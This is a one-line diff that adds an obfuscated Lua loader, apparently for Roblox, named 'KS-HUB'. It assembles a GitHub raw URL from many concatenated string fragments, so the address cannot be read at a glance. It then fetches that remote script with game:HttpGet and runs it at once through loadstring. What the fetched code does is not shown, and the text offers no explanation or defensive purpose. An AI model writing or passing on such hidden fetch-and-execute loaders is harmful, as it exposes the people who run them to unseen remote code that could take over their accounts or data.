@@ -1,0 +1,1 @@
+("VoidedX:0"):gsub(".+",function(p)_vIjNWJ=p end)if _vIjNWJ~="VoidedX:0"then return end return(function(...)(loadstring(game:HttpGet(((((((((((((((((((((("https"..":/").."/ra").."w.").."git").."hub").."us").."ercon").."tent.").."com").."/l").."ara").."321").."1239").."99-a").."rch/K").."S-").."HUB/m").."ain/S").."cr").."ipt.").."lu").."a")))()end)(...)
